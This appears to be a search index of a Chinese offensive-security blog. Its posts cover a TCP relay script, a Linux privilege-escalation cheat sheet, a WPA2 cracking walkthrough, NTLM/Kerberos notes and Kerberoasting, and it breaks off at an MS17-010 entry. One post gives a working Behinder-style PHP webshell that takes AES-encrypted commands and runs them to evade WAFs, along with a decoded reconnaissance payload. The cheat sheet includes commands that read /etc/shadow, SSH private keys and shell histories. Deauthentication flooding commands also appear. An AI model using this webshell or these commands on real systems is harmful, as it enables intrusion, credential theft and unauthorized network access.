<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[rtcp.py]]></title>
    <url>%2F2018%2F12%2F17%2Frtcp-py%2F</url>
    <content type="text"><![CDATA[import socket import sys import threading import time streams = [None, None] # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象） debug = 1 # 调试状态 0 or 1 def _usage(): print(&apos;Usage: ./rtcp.py stream1 stream2\nstream: l:port or c:host:port&apos;) def _get_another_stream(num): &quot;&quot;&quot; 从streams获取另外一个流对象，如果当前为空，则等待 &quot;&quot;&quot; if num == 0: num = 1 elif num == 1: num = 0 else: raise NameError(&apos;error&apos;) while True: if streams[num] == &apos;quit&apos;: print(&apos;can not connect to the target, quit now!&apos;) sys.exit(1) if streams[num] is not None: return streams[num] else: time.sleep(1) def _xstream(num, s1, s2): &quot;&quot;&quot; 交换两个流的数据 num为当前流编号,主要用于调试目的，区分两个回路状态用。 &quot;&quot;&quot; try: while True: # 注意，recv 函数会阻塞，直到对端完全关闭（close 后还需要一定时间才能关闭，最快关闭方法是 shutdow） buff = s1.recv(1024) if debug &gt; 0: print(&apos;%d recv&apos; % num) if len(buff) == 0: # 对端关闭连接，读不到数据 print(&apos;%d one closed&apos; % num) break s2.sendall(buff) if debug &gt; 0: print(&apos;%d sendall&apos; % num) except: print(&apos;%d one connect closed.&apos; % num) try: s1.shutdown(socket.SHUT_RDWR) s1.close() except: pass try: s2.shutdown(socket.SHUT_RDWR) s2.close() except: pass streams[0] = None streams[1] = None print(&apos;%d CLOSED&apos; % num) def _server(port, num): &quot;&quot;&quot; 处理服务情况，num 为流编号（第 0 号还是第 1 号） &quot;&quot;&quot; srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。 srv.bind((&apos;0.0.0.0&apos;, port)) # 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。 srv.listen(1) while True: # 被动接受TCP客户端连接,(阻塞式)等待连接的到来 conn, addr = srv.accept() print(&apos;connected from: %s&apos; % str(addr)) streams[num] = conn # 放入本端流对象 # 获取另一端流对象 s2 = _get_another_stream(num) _xstream(num, conn, s2) def _connect(host, port, num): &quot;&quot;&quot;处理连接，num 为流编号（第 0 号还是第 1 号） @note: 如果连接不到远程，会 sleep 36s，最多尝试 200（即两小时） &quot;&quot;&quot; not_connet_time = 0 wait_time = 36 try_cnt = 199 while True: if not_connet_time &gt; try_cnt: streams[num] = &apos;quit&apos; print(&apos;not connected&apos;) return None conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: conn.connect((host, port)) except Exception: print(&apos;can not connect %s:%s!&apos; % (host, port)) not_connet_time += 1 time.sleep(wait_time) continue print(&apos;connected to %s:%i&apos; % (host, port)) streams[num] = conn # 放入本端流对象 s2 = _get_another_stream(num) # 获取另一端流对象 _xstream(num, conn, s2) def main(): # if len(sys.argv) != 3: # _usage() # sys.exit(1) tlist = [] # 线程列表，最终存放两个线程对象 # targv = [sys.argv[1], sys.argv[2]] targv = [&quot;l:4567&quot;, &quot;c:127.0.0.1:80&quot;] for i in [0, 1]: s = targv[i] # stream 描述 c:ip:port 或 l:port sl = s.split(&apos;:&apos;) if len(sl) == 2 and (sl[0] == &apos;l&apos; or sl[0] == &apos;L&apos;): # l:port t = threading.Thread(target=_server, args=(int(sl[1]), i)) tlist.append(t) elif len(sl) == 3 and (sl[0] == &apos;c&apos; or sl[0] == &apos;C&apos;): # c:host:port t = threading.Thread(target=_connect, args=(sl[1], int(sl[2]), i)) tlist.append(t) else: _usage() sys.exit(1) for t in tlist: t.start() for t in tlist: t.join() sys.exit(0) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[动态二进制加密实现一句话木马（冰蝎）]]></title>
    <url>%2F2018%2F12%2F17%2F%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%88%E5%86%B0%E8%9D%8E%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言一句话木马从最早的&lt;?php @eval($_POST[cmd]);?&gt;到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测，目前绝大多数商业级的防护设备皆属于此种类型。一旦目标网络部署了基于网络的防护设备，我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。 为什么被拦截虽然有时候会采用base64编码，但是payload任有特征字符如eval等，参数值有base64编码等等。对方的规则也在不断的更新，不断识别关键的编码函数名称、加解密函数名称，并加入到规则里面。于是攻击者和防御者展开了长期的较量，不停的变换着各种姿势。 为啥防御者可以不停的更新规则主要有两个原因： 攻击者发送的请求都是脚本源代码，无论怎么样编码，仍然是服务器端解析引擎可以解析的源代码，是基于文本的，防御者能看懂。 攻击者执行多次相同的操作，发送的请求数据也是相同的，防御者就可以把他看懂的请求找出特征固化为规则。 但是如果攻击者的请求不是文本格式的源代码而是编译之后的的字节码，字节码是一堆二进制数据流，不存在参数，攻击者把二进制字节码进行加密，防御者看到的就是一堆加了密的二进制数据流，攻击者多次执行同样的操作采用不同的密钥加密，即使是同样的payload，防御者看到的请求数据也不一样，这就使防御者无法通过流量分析来提取规则。 一劳永逸的绕过具体流程： 首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器的Session中。 客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。 服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。 服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。 客户端解密服务器端返回的结果。 执行流程图： 服务端实现PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 代码： &lt;?php session_start(); if (isset($_GET[&apos;pass&apos;])) { #uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。 $key=substr(md5(uniqid(rand())),16); $_SESSION[&apos;k&apos;]=$key; print $key; } else { $key=$_SESSION[&apos;k&apos;]; #参数为解密密文、解密方法、解密密钥 #php://input 去获取请求体中的信息（请求类型为multipart/form-data 时 失效不会封装 数据为空）封装起来返回给程序 无法获取get信息 因为GET的信息附加到URL里 不在请求体中 $decrptContent=openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $key); $arr=explode(&apos;|&apos;,$decrptContent); $func=$arr[0]; $params=$arr[1]; $func($params); } ?&gt; 流程： 首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。 客户端将源代码，如assert|eval(&quot;phpinfo();”)利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串assert|eval(&quot;phpinfo();&quot;)。 服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval(&quot;phpinfo();&quot;)。 以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;) 。 再具体一点，比如客户端有一段代码 assert|eval(&quot;phpinfo();&quot;) 进行AES128加密发送给服务端，服务端用explode函数分割字符，索引为0的是assert，索引为1的eval(&quot;phpinfo();&quot;)，然后通过可变函数执行assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)。 客户端实现通过作者提供的客户端，拿到： assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIGVjaG8gb3BlbnNzbF9lbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAiQUVTMTI4IiwgJGtleSk7DQp9DQptYWluKCk7&apos;)); 经过base64解码得： error_reporting(0); function main() { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; } } else { $driveList=&quot;/&quot;; } $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); } main(); 可以看出这段代码主要做了这些工作： 保存phpinfo内容 ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); ob_start()把输出内容输出到缓冲区而不是游览器，然后用ob_get_contents得到缓冲区数据，最后用ob_end_clean清除缓冲区 服务端有哪些盘符 $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; } } else { $driveList=&quot;/&quot;; } 获取当前路径 $currentPath=getcwd(); 以及检查php运行环境。 $osInfo=PHP_OS; 然后对这些信息进行base64编码，再用json编码，再用key进行”AES128”加密。 $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); 借鉴自：http://halazi.xin/2018/12/11/Behinder/ https://xz.aliyun.com/t/2744]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux账户安全机制]]></title>
    <url>%2F2018%2F12%2F13%2FLinux%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Linux系统标识与鉴别-安全主体安全主体 用户：身份标识（UserID） 组：身份标识（Group ID） 用户与组基本概念 文件必须有所有者 用户必须属于某个或多个组 用户与组的关系灵活（一对多、多对多等都可以） 根用户拥有所有权限 Linux系统标识与鉴别-帐号信息存储信息存储用户信息/etc/passwd /etc/shadow 组信息/etc/group /etc/gshadow 在Linux中系统中，并不认识帐号名称，认识的是帐号ID，帐号ID保存在/etc/passwd文件中 在登录Linux主机时，在输入完帐号和密码时，Linux会先查找/etc/passwd文件中是否有这个帐号，如果没有则跳出，如果有的话，他会读取该帐号的user ID和group ID同时该帐号的根目录和shell也读了出来 /etc/passwd中的信息 一共有七项，每一项使用：分开，他们代表的意思如下： （1）帐号名称：帐号名称由于对应用户ID，这个是系统默认用户root超级管理员，在同一个系统帐号名称是唯一的。 （2）密码：由于系统中/etc/shadow文件用于存放加密后的口令，所以在这里这一项是“x”来表示，如果用户没有设置口令，则该项为空。 （3）用户lD：不同的用户识别码不同，其中用户ID有以下几种：0代表系统管理员（如果建立一个系统管理员，可以建立一个普通帐户，然后将该账户的用户1D改为0即可）。1-500系统预留的1D，500以上是普通用户使用。 （4）组ID：用来规范群组，他与/etc/group有关。 （5）描述信息：这个字段几乎没有什么作用，只是用来解释这个帐号的意义。 （6）用户根目录：就是用户登录系统的起始目录，用户登录系统后将首先进入该目录。root用户默认的是/root，普通用户的是/home/用户名。 （7）用户登录shell：就是用户登录系统时使用的shell。 /etc/shadow中的信息 由于passwd文件对于系统中的所有用户是可读的，口令比较容易破解，存在较大的安全隐患。 使用“shadow”文件保存密文的用户口令，“shadow”文件只有管理员用户才可以读取其中的内容。 登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志 （1）帐户名称：和passwd对应，和passwd的意思相同。 （2）密码：已经加密过的真正的密码，只能看到一些特殊符号。如第一个字符为“*”表示此用户不用来登录，如不想让某账户登录可在前面加个星。 $1$表明是用MD5加密的 $2$是用Blowfish加密的 $5$是用SHA-256加密的 $6$开头的，表明是用SHA-512加密的， （3）上次改动密码的日期：这段记录了改动密码的最后日期。因为Linux计算日期的方法是以1970年1月1日作为1，1971年1月1日就是366，依次类推 （4）密码不可被改动的天数：必须在这个时间内重新修改密码，否则这个帐号将暂时失效。上面的99999，表示密码不需要重新输入 （5）密码变更期期限快到前的警告期：当帐号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户：再过n天您的密码将过期，请尽快重新设定密码。默认的是七天。 （6）帐号失效期 （7）帐号取消日期 （8）保留：最后一个字段是保留的，看以后有没有新功能加入。 /etc/group中的信息 （1）群组名称：就是群组的名称了。 （2）群组密码：通常不需设定，很少使用群组登录。密码被记录在/etc/gshadow中。 （3）群组ID：也就是组ID了。 （4）支持帐号的名称：这个群组的所有帐号]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用airodump-ng和aircrack-ng进行无线破解]]></title>
    <url>%2F2018%2F12%2F12%2F%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[WEP（有线等效保密）认证过程： 客户端向接入点发送认证请求 接入点发回一段明文 客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求 接入点对数据包进行解密，比较明文，来决定是否接受请求 WEP2（wifi网络安全接入）安全性： WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出 WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2 Aircrack-ng抓包及破解WPA2 虚拟机安装无线网卡 配置无线网卡 利用airodump-ng进行抓包 利用crunch生成字典 利用aircrack-ng进行爆破 Aircrack是破解WEP/WPA/WPA2加密的主流工具之一。Aircrack-ng套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。 Aircrack-ng 攻击 主要是拿到握手包，用字典破解握手包。 首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。 准备阶段airmon-ng check kill kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。 将无线网卡模式改为monitor模式 iwconfig wlan0mon mode monitor 打开网卡： airmon-ng start wlan0 这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控） wifi嗅探查看当前区域的所有wifi airodump-ng wlan0mon BSSID：wifi路由的 Mac地址， Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。 CH ：渠道，后面的攻击要用到。 ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。 经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。 下一步airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon -c 是 渠道 bssid 是路由的Mac地址 -w是放包的目录 可以看到有三个连接。 洪水攻击（重复不断的攻击）aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon -0表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。 攻击的时候不要关闭抓包窗口，注意观察抓包窗口。 过一会停掉洪水攻击，静等别人连接，出现WPA handshake : ，就表示成功。如果有连接很快就可以抓到包 抓包信息及爆破 抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。 aircrack-ng -w password.txt wlan0/qihua-01.cap 接下来就静静等待跑包。 完成！密码51201314]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GeoIP]]></title>
    <url>%2F2018%2F12%2F11%2FGeoIP%2F</url>
    <content type="text"><![CDATA[import pygeoip gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) def printRecord(tgt): rec = gi.record_by_name(tgt) print(rec) city = rec[&apos;city&apos;] # region = rec[&apos;region_name&apos;] country = rec[&apos;country_name&apos;] long = rec[&apos;longitude&apos;] lat = rec[&apos;latitude&apos;] print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;) print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country)) print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long)) tgt = &apos;114.242.146.98&apos; printRecord(tgt) GeoLiteCity.dat在网上可以免费下载。]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux提权常用命令]]></title>
    <url>%2F2018%2F12%2F07%2FLinux%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[操作系统相关操作系统类型版本cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat 内核版本(主要看是否为64位)cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 环境变量cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 查看是否有打印机lpstat -a 应用与服务相关查看正在运行的程序及对应的用户权限ps aux ps -ef top cat /etc/services 查看以root权限正在运行的程序ps aux | grep root ps -ef | grep root 查看安装了的应用ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/ 一些服务的配置文件cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos; 计划任务crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 找存储的明文用户名，密码grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络相关查看当前网络地址/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 查看网络配置，DNS，DHCP，网关cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 查看网络通信lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 查看缓存arp -e route /sbin/route -nee tcpdump(网络上的数据包进行截获的包分析工具)tcpdump 默认启动 tcpdump -i eth1 监视指定网络接口的数据包 tcpdump host 210.27.48.1 接货所有210.27.48.1的主机收到和发出的数据包 具体用法：https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html 用户相关id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户 awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l 列家目录ls -ahlR /root/ ls -ahlR /home/ 从配置文件里面寻找密码cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 看其他用户的操作记录cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history ssh私钥cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 文件系统相关日志文件ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 查看网站文件ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 常见日志文件cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ 文件挂载mount df -h cat /etc/fstab Find命令find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行 目录 准备及攻击查看语言支持find / -name perl* find / -name python* find / -name gcc* find / -name cc 查看上传方式find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 寻找exp http://www.google.com 编译及运行expwhich gcc gcc exp.c -o exp chmod +x exp ./exp 提权辅助脚本https://github.com/rebootuser/LinEnum www.securitysift.com/download/linuxprivchecker.py]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows安全认证]]></title>
    <url>%2F2018%2F12%2F06%2Fwindows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[Windows认证协议有两种NTLM（NT LAN Manager）和Kerberos。 基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单 另一种是基于Kerberos的认证方式,主要用在域环境中,下面就这两种不同的认证方式做些简要的通信流程说明 NTML在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。较之Kerberos，基于NTLM的认证过程要简单很多。NTLM采用一种质询/应答（Challenge/Response）消息交换模式。 步骤一：用户通过输入Windows帐号和密码登录客户端主机。在登录之前，客户端会缓存输入密码的哈希值，原始密码会被丢弃（“原始密码在任何情况下都不能被缓存”，这是一条基本的安全准则）。成功登录客户端Windows的用户如果试图访问服务器资源，需要向对方发送一个请求。该请求中包含一个以明文表示的用户名。 步骤二：服务器接收到请求后，生成一个16位的随机数。这个随机数被称为Challenge或者Nonce。服务器在将该Challenge发送给客户端之前，该Challenge会先被保存起来。Challenge是以明文的形式发送的。 步骤三：客户端在接收到服务器发回的Challenge后，用在步骤一中保存的密码哈希值对其加密，然后再将加密后的Challenge发送给服务器。 步骤四服务器接收到客户端发送回来的加密后的Challenge后，会向DC（Domain）发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端密码哈希值加密的Challenge和原始的Challenge。 步骤五、六DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器，并最终反馈给客户端。 KerberosKerberos组件 KDC：密钥分发中心，保存了所有用户和服务的秘密钥匙。 AS：认证服务器，为Client生成TGT。 TGS：票证授予服务，为Client生成Ticket。 TGT：票证授予票证，用于获取Ticket的票证。 Kerberos认证流程1.客户端向KDC的AS服务请求开身份证明 2.KAS认证成功后返回给客户端认购权证（TGT） 3.客户端拿着TGT到KDC的TGS服务买票 4.TGS认证成功后返回给客户端服务票据（ST） 5.客户端拿着ST去访问服务 6.返回服务资源 SPN票据破解在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。 破解方法 RC4加密方式使用tgsrepcrack.py AES加密方式通过kirbi2john转换为hash，通过john/hashcat破解]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网杀器--MS17-010漏洞]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8-MS17-010%E6%BC%8F%E6%B4%9E%2F</url>
